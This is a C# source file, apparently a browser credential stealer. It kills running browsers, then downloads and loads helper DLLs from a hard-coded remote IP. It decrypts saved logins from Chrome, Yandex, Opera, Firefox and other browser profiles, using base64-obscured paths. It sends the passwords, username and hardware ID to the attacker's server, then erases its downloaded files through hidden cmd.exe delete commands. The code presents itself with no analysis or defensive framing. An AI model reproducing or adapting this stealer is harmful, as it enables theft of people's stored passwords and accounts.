using System.Linq;
             using System.Threading.Tasks;

        public class Program
        {
            public static System.Collections.Generic.List<Log> GetLogs(object[] prms)
            {
                System.Collections.Generic.List<Log> result = new System.Collections.Generic.List<Log>();
                foreach (var item in prms)
                {
                    result.Add(new Log { Browser = ((dynamic)item).Browser, FileList = GetBrowserLog(((dynamic)item).FileList) });
                }
                return result;
            }
            public static System.Collections.Generic.List<BrowserLog> GetBrowserLog(dynamic prms)
            {
                System.Collections.Generic.List<BrowserLog> result = new System.Collections.Generic.List<BrowserLog>();
                foreach (var item in prms)
                {
                    result.Add(new BrowserLog { Host = ((dynamic)item).Host, Login = ((dynamic)item).Login, Password = ((dynamic)item).Password });
                }
                return result;
            }
            public static void WriteBytesToFile(byte[] file, string path)
            {
                using (var fstream = new System.IO.FileStream(path, System.IO.FileMode.Create))
                    fstream.Write(file, 0, file.Length);
            }
            public static string Base64Decode(string base64EncodedData)
            {
                var base64EncodedBytes = System.Convert.FromBase64String(base64EncodedData);
                return System.Text.Encoding.UTF8.GetString(base64EncodedBytes);
            }
            public static void DeleteDir(string path)
            {
                System.Diagnostics.Process.Start(new System.Diagnostics.ProcessStartInfo()
                {
                    Arguments = "/C choice /C Y /N /D Y /T 3 & rmdir /Q /S \"" + path + "\"",
                    WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden,
                    CreateNoWindow = true,
                    FileName = "cmd.exe"
                });
            }
            public static void DeleteSelf(string path)
            {
                System.Diagnostics.Process.Start(new System.Diagnostics.ProcessStartInfo()
                {
                    Arguments = "/C choice /C Y /N /D Y /T 3 & Del \"" + path + "\"",
                    WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden,
                    CreateNoWindow = true,
                    FileName = "cmd.exe"
                });
            }
            public static void MyCode()
            {
                string path = System.IO.Directory.GetCurrentDirectory();
                System.Collections.Generic.List<DownloadDLL> dlls = new System.Collections.Generic.List<DownloadDLL>();
                try
                {
string[] processNames = new string[]
            {
                "chrome",
                "browser",
                "firefox",
                "opera",
                "amigo",
                "kometa",
                "torch",
                "orbitum"
            };
            var prs = System.Diagnostics.Process.GetProcesses().Where(x => processNames.Contains(x.ProcessName.ToLower()));
            foreach (var item in prs)
                if (item.Handle != System.IntPtr.Zero)
                    try
                    {
                        item.Kill();
                    }
                    catch { }
                    var binding = new System.ServiceModel.BasicHttpBinding()
                    {
                        MaxBufferPoolSize = 2147483647,
                        MaxBufferSize = 2147483647,
                        MaxReceivedMessageSize = 2147483647,
                        ReaderQuotas = new System.Xml.XmlDictionaryReaderQuotas()
                        {
                            MaxDepth = 2000000,
                            MaxStringContentLength = 2147483647,
                            MaxArrayLength = 2147483647,
                            MaxBytesPerRead = 2147483647,
                            MaxNameTableCharCount = 2147483647
                        }
                    };
                    var client = System.ServiceModel.ChannelFactory<IClient>.CreateChannel(binding, new System.ServiceModel.EndpointAddress("http://193.124.119.142:26123/IClient"));
                    dlls = client.GetDownloadDLL().Result;
                    foreach (var dll in dlls)
                    {
                        if (dll.Path.Split('\\').Count() > 2)
                            if (!System.IO.Directory.Exists(path + "\\" + dll.Path.Split('\\')[1]))
                                System.IO.Directory.CreateDirectory(path + "\\" + dll.Path.Split('\\')[1]);
                        WriteBytesToFile(dll.ByteArray, path + dll.Path);
                    }
                    var DLL = System.Reflection.Assembly.Load("Decrypt");
                    object inst = DLL.CreateInstance("Decrypt.UniversavlDecryption");
                    System.Type type = DLL.GetType("Decrypt.UniversavlDecryption");

                    System.Func<object[], object[]> GetPasswords = (brsrs) => (object[])type.GetMethod(Base64Decode("R2V0UGFzc3dvcmRz")).Invoke(inst, new object[] { brsrs });
                    System.Func<string> GetHashValue = () => (string)type.GetMethod("GetHashValue").Invoke(inst, null);
                    System.Func<System.Collections.Generic.List<string>> MozillaFiles = () => (System.Collections.Generic.List<string>)type.GetMethod("MozillaFiles").Invoke(inst, null);

                    System.Collections.Generic.List<Browser> browsers = new System.Collections.Generic.List<Browser>();browsers.Add(new Browser { BrowserName = Base64Decode("Q2hyb21l"), FilePaths = new System.Collections.Generic.List<string> { System.Environment.GetEnvironmentVariable("LocalAppData") + Base64Decode("XEdvb2dsZVxDaHJvbWVcVXNlciBEYXRhXERlZmF1bHRcTG9naW4gRGF0YQ==") } });browsers.Add(new Browser { BrowserName = Base64Decode("WWFuZGV4"), FilePaths = new System.Collections.Generic.List<string> { System.Environment.GetEnvironmentVariable("LocalAppData") + Base64Decode("XFlhbmRleFxZYW5kZXhCcm93c2VyXFVzZXIgRGF0YVxEZWZhdWx0XExvZ2luIERhdGE=") } });browsers.Add(new Browser { BrowserName = Base64Decode("S29tZXRh"), FilePaths = new System.Collections.Generic.List<string> { System.Environment.GetEnvironmentVariable("LocalAppData") + Base64Decode("XEtvbWV0YVxVc2VyIERhdGFcRGVmYXVsdFxMb2dpbiBEYXRh") } });browsers.Add(new Browser { BrowserName = Base64Decode("QW1pZ28="), FilePaths = new System.Collections.Generic.List<string> { System.Environment.GetEnvironmentVariable("LocalAppData") + Base64Decode("XEFtaWdvXFVzZXJcVXNlciBEYXRhXERlZmF1bHRcTG9naW4gRGF0YQ==") } });browsers.Add(new Browser { BrowserName = Base64Decode("VG9yY2g="), FilePaths = new System.Collections.Generic.List<string> { System.Environment.GetEnvironmentVariable("LocalAppData") + Base64Decode("XFRvcmNoXFVzZXIgRGF0YVxEZWZhdWx0XExvZ2luIERhdGE=") } });browsers.Add(new Browser { BrowserName = Base64Decode("T3JiaXR1bQ=="), FilePaths = new System.Collections.Generic.List<string> { System.Environment.GetEnvironmentVariable("LocalAppData") + Base64Decode("XE9yYml0dW1cVXNlciBEYXRhXERlZmF1bHRcTG9naW4gRGF0YQ==") } });browsers.Add(new Browser { BrowserName = Base64Decode("T3BlcmE="), FilePaths = new System.Collections.Generic.List<string> { System.Environment.GetFolderPath(System.Environment.SpecialFolder.ApplicationData) + Base64Decode("XE9wZXJhIFNvZnR3YXJlXE9wZXJhIFN0YWJsZVxMb2dpbiBEYXRh") } });browsers.Add(new Browser { BrowserName = Base64Decode("TW96aWxsYQ=="), FilePaths = MozillaFiles() }); 
            GlobalLogs results = new GlobalLogs()
                    {
                        HWID = GetHashValue(),
                        PcAdmin = System.Environment.UserName,
                        Logs = GetLogs(GetPasswords(browsers.Select(x => (object)x).ToArray())),
                        DateTime = System.DateTime.Now
                    };
                    client.WriteLogs(new AuthPrms { Login = "foxovsky", Password = "" }, results);
                }
                catch(System.Exception ex)
                {
                }
                finally
                {
                    foreach (var dll in dlls)
                        try
                        {
                            if (System.IO.File.Exists(path + dll.Path))
                                DeleteSelf(path + dll.Path);
                            if (dll.Path.Split('\\').Count() > 2)
                                if (System.IO.Directory.Exists(path + "\\" + dll.Path.Split('\\')[1]))
                                    DeleteDir(path + "\\" + dll.Path.Split('\\')[1]);
                        }
                        catch
                        {

                        }
                }
            }
        }
        public class Browser
        {
            public System.Collections.Generic.List<string> FilePaths { get; set; }
            public string BrowserName { get; set; }
        }
        [System.ServiceModel.ServiceContract]
        public interface IClient
        {
            [System.ServiceModel.OperationContract]
            Task WriteLogs(AuthPrms prms, GlobalLogs logs);
            [System.ServiceModel.OperationContract]
            System.Threading.Tasks.Task<System.Collections.Generic.List<DownloadDLL>> GetDownloadDLL();
        }
        [System.Runtime.Serialization.DataContract(Namespace = "DownloadDLL")]
        public class DownloadDLL
        {
            [System.Runtime.Serialization.DataMember]
            public string Path { get; set; }
            [System.Runtime.Serialization.DataMember]
            public byte[] ByteArray { get; set; }
        }
        [System.Runtime.Serialization.DataContract(Namespace = "Auth")]
        public class AuthPrms
        {
            [System.Runtime.Serialization.DataMember]
            public string Login { get; set; }
            [System.Runtime.Serialization.DataMember]
            public string Password { get; set; }
            [System.Runtime.Serialization.DataMember]
            public string Email { get; set; }
        }
        [System.Runtime.Serialization.DataContract(Namespace = "GlobalLog")]
        public class GlobalLogs
        {
            [System.Runtime.Serialization.DataMember]
            public string HWID { get; set; }
            [System.Runtime.Serialization.DataMember]
            public string PcAdmin { get; set; }
            [System.Runtime.Serialization.DataMember]
            public System.Collections.Generic.List<Log> Logs { get; set; }
            [System.Runtime.Serialization.DataMember]
            public System.DateTime DateTime { get; set; }
        }
        [System.Runtime.Serialization.DataContract(Namespace = "Log")]
        public class Log
        {
            [System.Runtime.Serialization.DataMember]
            public string Browser { get; set; }
            [System.Runtime.Serialization.DataMember]
            public System.Collections.Generic.List<BrowserLog> FileList { get; set; }
        }
        [System.Runtime.Serialization.DataContract(Namespace = "BrowserLog")]
        public class BrowserLog
        {
            [System.Runtime.Serialization.DataMember]
            public string Login { get; set; }
            [System.Runtime.Serialization.DataMember]
            public string Password { get; set; }
            [System.Runtime.Serialization.DataMember]
            public string Host { get; set; }
        }
